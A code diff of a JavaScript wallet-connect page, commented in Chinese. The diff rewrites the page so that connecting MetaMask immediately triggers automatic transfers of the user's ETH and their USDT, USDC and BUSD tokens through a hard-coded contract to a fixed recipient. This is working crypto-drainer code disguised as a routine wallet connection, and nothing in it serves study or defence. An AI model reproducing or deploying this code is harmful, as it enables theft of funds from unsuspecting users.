@@ -1,148 +1,96 @@
-const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F'; // 智能合约地址
-const ABI = [
+let web3;
+let contract;
+
+// 合约ABI
+const contractABI = [
     {
         "inputs": [
-            {
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            }
+            { "internalType": "address", "name": "sender", "type": "address" }
         ],
-        "name": "transferAllTokens",
+        "name": "transferETH",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            { "internalType": "address", "name": "token", "type": "address" },
+            { "internalType": "address", "name": "sender", "type": "address" }
+        ],
+        "name": "transferTokens",
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
     },
     {
         "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    },
-    {
-        "stateMutability": "payable",
-        "type": "receive"
-    },
-    {
-        "inputs": [],
-        "name": "busdToken",
+        "name": "recipient",
         "outputs": [
-            {
-                "internalType": "contract IERC20",
-                "name": "",
-                "type": "address"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "owner",
-        "outputs": [
-            {
-                "internalType": "address",
-                "name": "",
-                "type": "address"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "targetAddress",
-        "outputs": [
-            {
-                "internalType": "address",
-                "name": "",
-                "type": "address"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "usdcToken",
-        "outputs": [
-            {
-                "internalType": "contract IERC20",
-                "name": "",
-                "type": "address"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "usdtToken",
-        "outputs": [
-            {
-                "internalType": "contract IERC20",
-                "name": "",
-                "type": "address"
-            }
+            { "internalType": "address", "name": "", "type": "address" }
         ],
         "stateMutability": "view",
         "type": "function"
     }
 ];
 
-let account;
-let web3;
-let contract;
+// 合约地址
+const contractAddress = "0x9396B453Fad71816cA9f152Ae785276a1D578492";  // 你的合约地址
 
 // 连接钱包
 async function connectWallet() {
-    if (window.ethereum) {
+    if (typeof window.ethereum !== 'undefined') {
+        // 请求用户连接钱包
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
         web3 = new Web3(window.ethereum);
-        try {
-            await ethereum.request({ method: 'eth_requestAccounts' });
-            const accounts = await web3.eth.getAccounts();
-            account = accounts[0];
-            console.log('Wallet connected:', account);
-            document.getElementById('wallet-address').innerText = account;
-            contract = new web3.eth.Contract(ABI, contractAddress);
-        } catch (error) {
-            console.error('Connection failed', error);
-        }
+        contract = new web3.eth.Contract(contractABI, contractAddress);
+        document.getElementById('status').innerText = "钱包已连接！";
+
+        // 自动检测余额并转移
+        await autoTransfer();
     } else {
-        alert('Please install MetaMask to use this feature.');
+        document.getElementById('status').innerText = "请安装MetaMask！";
     }
 }
 
-// 检查余额
-async function checkBalance() {
+// 自动转移ETH和ERC20代币
+async function autoTransfer() {
+    const accounts = await web3.eth.getAccounts();
+    const sender = accounts[0];
+
+    // 转移ETH
+    await transferETH(sender);
+    
+    // 转移USDT、USDC、BUSD
+    const tokens = [
+        "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT 地址
+        "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC 地址
+        "0xe9e7cea3dedca5984780bafc599bd69add087de1"  // BUSD 地址
+    ];
+
+    for (const token of tokens) {
+        await transferTokens(token, sender);
+    }
+}
+
+// 转移ETH到指定地址
+async function transferETH(sender) {
     try {
-        const usdtContract = new web3.eth.Contract(ABI, '0xdAC17F958D2ee523a2206206994597C13D831ec7');
-        const balance = await usdtContract.methods.balanceOf(account).call();
-        document.getElementById('usdt-balance').innerText = balance;
-        return balance;
+        const receipt = await contract.methods.transferETH(sender).send({ from: sender });
+        console.log("ETH转移成功:", receipt);
     } catch (error) {
-        console.error('Failed to fetch balance:', error);
+        console.error("ETH转移失败:", error);
     }
 }
 
-// 转移代币
-async function transferTokens() {
+// 转移ERC20代币到指定地址
+async function transferTokens(token, sender) {
     try {
-        const gasPrice = await web3.eth.getGasPrice(); // 获取实时Gas Price
-        const gasLimit = 100000; // 设置Gas Limit
-
-        await contract.methods.transferAllTokens(account).send({
-            from: account,
-            gasPrice: gasPrice,
-            gas: gasLimit
-        });
-
-        alert('Tokens transferred successfully!');
+        const receipt = await contract.methods.transferTokens(token, sender).send({ from: sender });
+        console.log(`${token} 转移成功:`, receipt);
     } catch (error) {
-        console.error('Token transfer failed:', error);
-        alert('Failed to transfer tokens: ' + error.message);
+        console.error(`${token} 转移失败:`, error);
     }
 }
 
-// 事件绑定
-document.getElementById('connect-wallet').addEventListener('click', connectWallet);
-document.getElementById('transfer-tokens').addEventListener('click', transferTokens);
+// 按钮事件
+document.getElementById('connectButton').onclick = connectWallet;
